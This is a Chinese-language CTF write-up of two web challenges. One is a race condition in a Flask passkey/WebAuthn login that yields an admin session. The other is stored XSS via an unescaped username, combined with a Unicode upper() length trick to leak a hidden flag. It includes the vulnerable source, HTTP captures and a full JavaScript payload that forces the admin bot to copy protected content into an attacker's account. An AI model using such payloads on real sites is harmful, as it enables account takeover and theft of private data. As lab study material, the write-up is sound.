---
typora-root-url: SparkCTF-Web
title: SparkCTF-Web
toc: true
categories:
  - ctf
date: 2026-03-11 22:15:08
tags: 
  - ctf

---



## The Key To Pass

```
import json
import re
import time
import uuid
from hashlib import sha256
from typing import Optional

import redis
from flask import Flask, jsonify, redirect, render_template, request, session, url_for
from werkzeug.middleware.proxy_fix import ProxyFix
from webauthn import (
    generate_authentication_options,
    generate_registration_options,
    options_to_json,
    verify_authentication_response,
    verify_registration_response,
)
try:
    from webauthn.helpers import parse_authentication_credential_json, parse_registration_credential_json
except ImportError:
    parse_authentication_credential_json = None
    parse_registration_credential_json = None
from webauthn.helpers.structs import PublicKeyCredentialDescriptor, UserVerificationRequirement

from app.init_data import bootstrap
from app.logger import Logger
from app.models import (
    create_credential,
    create_user,
    get_credential_by_id,
    get_credential_for_user,
    get_user_by_id,
    get_user_by_username,
    list_credentials_for_user,
    update_credential_sign_count,
)
from app.utils import (
    b64url_decode,
    b64url_encode,
    get_database_path,
    get_flag,
    get_origin,
    get_origin_host,
    get_redis_url,
    get_rp_id,
    get_rp_name,
    get_secret_key,
    sha256_hex,
)


CHALLENGE_TTL_SECONDS = 120
REGISTRATION_TTL_SECONDS = 300
USERNAME_RE = re.compile(r"^[A-Za-z0-9_]{3,32}$")


bootstrap()

app = Flask(__name__, template_folder="templates", static_folder="static")
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1)
app.config.update(
    SECRET_KEY=get_secret_key(),
    SESSION_COOKIE_NAME="tkp_session",
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
)

redis_client = redis.Redis.from_url(get_redis_url(), decode_responses=True)


def get_or_create_session_id() -> str:
    if "sid" not in session:
        session["sid"] = uuid.uuid4().hex
    return session["sid"]


def current_user():
    user_id = session.get("user_id")
    if not user_id:
        return None
    return get_user_by_id(user_id)


def wants_json() -> bool:
    return request.path.startswith("/login/") or request.path.startswith("/register/") or request.path == "/healthz"


def error_response(message: str, status_code: int = 400):
    if wants_json():
        return jsonify({"ok": False, "error": message}), status_code
    return render_template("index.html", user=current_user(), error=message), status_code


def challenge_key_for_session() -> str:
    return f"challenge:{get_or_create_session_id()}"


def register_key_for_session() -> str:
    return f"register:{get_or_create_session_id()}"


def validate_username(raw_username: str) -> Optional[str]:
    username = raw_username.strip()
    if not USERNAME_RE.fullmatch(username):
        return None
    return username


@app.get("/")
def index():
    return render_template("index.html", user=current_user(), error=None)


@app.get("/register")
def register_page():
    return render_template("register.html", user=current_user(), error=None)


@app.post("/register/begin")
def register_begin():
    payload = request.get_json(silent=True) or {}
    username = validate_username(payload.get("username", ""))
    if not username:
        return jsonify({"ok": False, "error": "username must be 3-32 chars of letters, digits, or underscore"}), 400

    if get_user_by_username(username):
        return jsonify({"ok": False, "error": "username already exists"}), 400

    user_handle = sha256(f"user:{username}".encode("utf-8")).digest()[:16]
    options = generate_registration_options(
        rp_id=get_rp_id(),
        rp_name=get_rp_name(),
        user_id=user_handle,
        user_name=username,
        timeout=60000,
    )

    redis_client.setex(
        register_key_for_session(),
        REGISTRATION_TTL_SECONDS,
        json.dumps({"challenge": b64url_encode(options.challenge), "username": username}),
    )
    return jsonify(json.loads(options_to_json(options)))


@app.post("/register/finish")
def register_finish():
    credential = request.get_json(silent=True) or {}
    parsed_credential = credential
    if parse_registration_credential_json is not None:
        parsed_credential = parse_registration_credential_json(json.dumps(credential))

    raw_state = redis_client.get(register_key_for_session())
    if raw_state is None:
        return jsonify({"ok": False, "error": "registration state expired"}), 400

    state = json.loads(raw_state)
    username = state["username"]
    if get_user_by_username(username):
        redis_client.delete(register_key_for_session())
        return jsonify({"ok": False, "error": "username already exists"}), 400

    try:
        verification = verify_registration_response(
            credential=parsed_credential,
            expected_challenge=b64url_decode(state["challenge"]),
            expected_rp_id=get_rp_id(),
            expected_origin=get_origin(),
            require_user_verification=False,
        )
    except Exception as exc:
        return jsonify({"ok": False, "error": f"registration verification failed: {exc}"}), 400

    user = create_user(username, is_admin=False)
    create_credential(
        user_id=user.id,
        credential_id=b64url_encode(verification.credential_id),
        public_key=b64url_encode(verification.credential_public_key),
        sign_count=verification.sign_count,
    )

    redis_client.delete(register_key_for_session())
    session["user_id"] = user.id
    return jsonify({"ok": True, "redirect": url_for("dashboard")})


@app.get("/login")
def login_page():
    return render_template("login.html", user=current_user(), error=None)


@app.post("/login/begin")
def login_begin():
    payload = request.get_json(silent=True) or {}
    username = validate_username(payload.get("username", ""))
    if not username:
        return jsonify({"ok": False, "error": "valid username is required"}), 400

    user = get_user_by_username(username)
    if user is None:
        return jsonify({"ok": False, "error": "unknown user"}), 404

    credentials = list_credentials_for_user(user.id)
    if not credentials:
        return jsonify({"ok": False, "error": "user has no passkeys"}), 400

    options = generate_authentication_options(
        rp_id=get_rp_id(),
        allow_credentials=[
            PublicKeyCredentialDescriptor(id=b64url_decode(credential.credential_id))
            for credential in credentials
        ],
        timeout=60000,
        user_verification=UserVerificationRequirement.PREFERRED,
    )

    redis_client.setex(
        challenge_key_for_session(),
        CHALLENGE_TTL_SECONDS,
        json.dumps(
            {
                "challenge": b64url_encode(options.challenge),
                "username": user.username,
                "created_at": time.time(),
            }
        ),
    )
    return jsonify(json.loads(options_to_json(options)))


@app.post("/login/finish")
def login_finish():
    credential = request.get_json(silent=True) or {}
    parsed_credential = credential
    if parse_authentication_credential_json is not None:
        parsed_credential = parse_authentication_credential_json(json.dumps(credential))

    presented_credential_id = credential.get("id", "")
    if not presented_credential_id:
        return jsonify({"ok": False, "error": "credential id is required"}), 400

    raw_state = redis_client.get(challenge_key_for_session())
    if raw_state is None:
        return jsonify({"ok": False, "error": "challenge expired"}), 400

    state = json.loads(raw_state)

    if not state.get("verification_complete"):
        expected_user = get_user_by_username(state["username"])
        if expected_user is None:
            return jsonify({"ok": False, "error": "expected login user disappeared"}), 400

        expected_credential = get_credential_for_user(expected_user.id, presented_credential_id)
        if expected_credential is None:
            return jsonify({"ok": False, "error": "credential is not registered for this username"}), 400

        try:
            verification = verify_authentication_response(
                credential=parsed_credential,
                expected_challenge=b64url_decode(state["challenge"]),
                expected_rp_id=get_rp_id(),
                expected_origin=get_origin(),
                credential_public_key=b64url_decode(expected_credential.public_key),
                credential_current_sign_count=expected_credential.sign_count,
                require_user_verification=False,
            )
        except Exception as exc:
            return jsonify({"ok": False, "error": f"authentication failed: {exc}"}), 400

        update_credential_sign_count(expected_credential.credential_id, verification.new_sign_count)

        state["verification_complete"] = True
        state["verified_credential_id"] = expected_credential.credential_id
        redis_client.setex(challenge_key_for_session(), CHALLENGE_TTL_SECONDS, json.dumps(state))


    log = Logger("app.log")
    log.log(f"User {state['username']} authenticated with credential {presented_credential_id}")
    redis_client.delete(challenge_key_for_session())

    final_credential = get_credential_by_id(presented_credential_id)
    if final_credential is None:
        return jsonify({"ok": False, "error": "unknown credential id"}), 400

    final_user = get_user_by_id(final_credential.user_id)
    if final_user is None:
        return jsonify({"ok": False, "error": "credential owner disappeared"}), 400

    session["user_id"] = final_user.id
    return jsonify(
        {
            "ok": True,
            "redirect": url_for("dashboard"),
            "user": final_user.username,
            "is_admin": final_user.is_admin,
        }
    )


@app.get("/dashboard")
def dashboard():
    user = current_user()
    if user is None:
        return redirect(url_for("login_page"))

    credentials = [
        {
            "hash": sha256_hex(credential.credential_id),
            "sign_count": credential.sign_count,
        }
        for credential in list_credentials_for_user(user.id)
    ]
    return render_template(
        "dashboard.html",
        user=user,
        credentials=credentials,
        flag=get_flag() if user.is_admin else None,
    )


@app.get("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))




if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)

```

admin才能拿flag

第一：login时伪造admin拿到session

第二：注册一个is_admin=True的账户

先看看login是是怎么确认身份的

begin不确认身份，却泄露了一点任意用户的信息，可能可以用来伪造身份

finish确定身份，需要一个id

先看下admin的begin，后面应该（肯定）会用到

```
POST /login/begin HTTP/1.1
Content-Type: application/json
Host: bxs-archive-0hg23pn4jcbzxygy7nqmn.minori.node.bxs.team:83

{"username": "admin"}

HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 11 Mar 2026 05:57:24 GMT
Content-Type: application/json
Connection: keep-alive
Set-Cookie: tkp_session=eyJzaWQiOiJkYTI1ZDllYTQ5ZDY0YjlmYWJiMzY3MTM1MDY5NmYxNCJ9.abEERA.q0WVLXXwHG9vglpdkUhKs_vKmLY; HttpOnly; Path=/; SameSite=Lax
Vary: Cookie
Content-Length: 308

{"allowCredentials":[{"id":"A_XxMilPYsZ2b3vi2tllSPl-3glWQD4OIpEJfAvhLsI","type":"public-key"}],"challenge":"q_UaL5NNq4u0O2EwJbY51mSvcYk_DotltVmdEZukikxO9trNv4VLEdPetAaD3I3WtXBEW7V-eAmVvVcHOflDUA","rpId":"bxs-archive-0hg23pn4jcbzxygy7nqmn.minori.node.bxs.team","timeout":60000,"userVerification":"preferred"}

```

公钥登录

先注册一个aaa

登录时，最后用id来验证身份

```
final_credential = get_credential_by_id(presented_credential_id)
    if final_credential is None:
        return jsonify({"ok": False, "error": "unknown credential id"}), 400

    final_user = get_user_by_id(final_credential.user_id)
    if final_user is None:
        return jsonify({"ok": False, "error": "credential owner disappeared"}), 400

    session["user_id"] = final_user.id
    return jsonify(
        {
            "ok": True,
            "redirect": url_for("dashboard"),
            "user": final_user.username,
            "is_admin": final_user.is_admin,
        }
    )
```

但是要verification_complete为True绕过

这个值在redis里取的，尝试条件竞争

抓包去发

![image-20260311151354332](image-20260311151354332.png)

用这个cookie访问flag界面即可

## Slay the Deadline

一眼xss

阻碍：

1. flag藏起来了
2. title与content写入都实体编码了

基本打不了，找其他能xss的地方

发现view界面有用户名

尝试用户名注册成js代码，但是jinja2模板输出转义了

看了下view.html

```
{% extends "layout.html" %}
{% block content %}
<h1>{{ title }}</h1>
<div class="content">
    {{ content | safe }}
</div>
<p>作者: {{ todo.owner }}</p>

<div class="actions">
    <a href="/">回到主页</a>

    <form action="{{ url_for('share', todo_id=todo.id) }}" method="POST" style="display: inline;">
        <button type="submit">分享给管理员</button>
    </form>
</div>
{% endblock %}

```

 content | safe 直接输出了，应该是在这xss

但是写入有编码，只能构造标签逃逸

```
def add_todo(user, title: str, content: str):  
    safe_title = html.escape(title)
    safe_content = html.escape(content)

    metadata = f"<title>{safe_title}</title><TODO>{safe_content}</TODO><author>{user['username']}</author>"
```

发现add时username可控又不编码，只需js代码之后</TODO>即可

构造用户名为

```
<script>alert(11)</script></TODO>
```

查看view时成功执行

接下来就是flag藏起来的问题，想办法逃逸flag

先看更新逻辑

```
@app.route("/edit/<int:todo_id>", methods=["GET", "POST"])
def edit(todo_id):
    if "username" not in session:
        return redirect(url_for("login"))

    if request.method == "POST":
        title = request.form["title"]
        content = request.form["content"]
        user = {"username": session["username"]}
        db.update_todo(user, todo_id, title, content)
        return redirect(url_for("index"))

    todo = db.get_todo(todo_id)
    if not todo or todo["owner"] != session["username"]:
        return "Not found or denied", 403
        
    raw = todo["metadata"]
    title = utils.get_tag_content(raw, "title")
    content = utils.get_tag_content(raw, "TODO")
    
    return render_template("edit.html", todo=todo, title=title, content=content)
    
    

def update_todo(user, todo_id, title, content):
    todo = get_todo(todo_id)
    if not todo:
        return {"success": False, "message": "Todo not found"}

    if todo["owner"] != user["username"]:
        return {"success": False, "message": "Permission denied"}
    current_raw = todo["metadata"]
    end_marker = "</TODO>"
    split_index = current_raw.rfind(end_marker)

    if split_index != -1:
        suffix = current_raw[split_index + len(end_marker):]
    else:
        suffix = ""

    safe_title = html.escape(title)
    safe_content = html.escape(content)
    new_raw = f"<title>{safe_title}</title><TODO>{safe_content}</TODO>{suffix}"
    todo["metadata"] = new_raw
    return {"success": True}
```

update_todo基本搞不了

utils.get_tag_content时

```
def get_tag_content(text, tag_name):
    if not text:
        return ""
    tag_upper = tag_name.upper()
    start_tag = f"<{tag_upper}>"
    end_tag = f"</{tag_upper}>"
    upper_text = text.upper()
    start_idx = upper_text.find(start_tag)
    if start_idx == -1:
        return ""
    end_idx = upper_text.rfind(end_tag)
    if end_idx == -1:
        return ""
    return text[start_idx + len(start_tag): end_idx]
```

某些特殊字符upper()时长度会变，这里只用找个变长的放到content里，返回text时会把flag带出来

```
for i in range(0xffff):
    if len(chr(i).upper())>1:
        print(len(chr(i)),end='')
        print(chr(i), end='')
        print(len(chr(i).upper()),end=' ')
        
//1ß2 1ŉ2 1ǰ2 1ΐ3 1ΰ3 1և2 1ẖ2 1ẗ2 1ẘ2 1ẙ2 1ẚ2 1ὐ2 1ὒ3 1ὔ3 1ὖ3 1ᾀ2 1ᾁ2 1ᾂ2 1ᾃ2 1ᾄ2 1ᾅ2 1ᾆ2 1ᾇ2 1ᾈ2 1ᾉ2 1ᾊ2 1ᾋ2 1ᾌ2 1ᾍ2 1ᾎ2 1ᾏ2 1ᾐ2 1ᾑ2 1ᾒ2 1ᾓ2 1ᾔ2 1ᾕ2 1ᾖ2 1ᾗ2 1ᾘ2 1ᾙ2 1ᾚ2 1ᾛ2 1ᾜ2 1ᾝ2 1ᾞ2 1ᾟ2 1ᾠ2 1ᾡ2 1ᾢ2 1ᾣ2 1ᾤ2 1ᾥ2 1ᾦ2 1ᾧ2 1ᾨ2 1ᾩ2 1ᾪ2 1ᾫ2 1ᾬ2 1ᾭ2 1ᾮ2 1ᾯ2 1ᾲ2 1ᾳ2 1ᾴ2 1ᾶ2 1ᾷ3 1ᾼ2 1ῂ2 1ῃ2 1ῄ2 1ῆ2 1ῇ3 1ῌ2 1ῒ3 1ΐ3 1ῖ2 1ῗ3 1ῢ3 1ΰ3 1ῤ2 1ῦ2 1ῧ3 1ῲ2 1ῳ2 1ῴ2 1ῶ2 1ῷ3 1ῼ2 1ﬀ2 1ﬁ2 1ﬂ2 1ﬃ3 1ﬄ3 1ﬅ2 1ﬆ2 1ﬓ2 1ﬔ2 1ﬕ2 1ﬖ2 1ﬗ2 
```

现在构造xss payload就好

session 的httponly是开的，所以尝试把flag写到一个用户的view

这里试了半天，cookie直接传不了，可以login一个用户（cookie就会变）但是界面不刷新是不变的

注册登录用户名

```
<script>(async () => {await fetch("/edit/1",{method: "POST",headers: { 'Content-Type': 'application/x-www-form-urlencoded',},body:new URLSearchParams({
      title: 'aaa',
      content: 'ß'.repeat(80)
    })});const f = await fetch('/view/1').then(r => r.text());await fetch('/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: 'username=aaa&password=aaa',
      credentials: 'include'});await fetch('/create',{method: "POST",credentials: 'include',headers:{ 'Content-Type': 'application/x-www-form-urlencoded',},body: "title=addda&content=" + encodeURIComponent(f)})})();</script></TODO>
```

随便创建一个todo，然后share对应编号即可
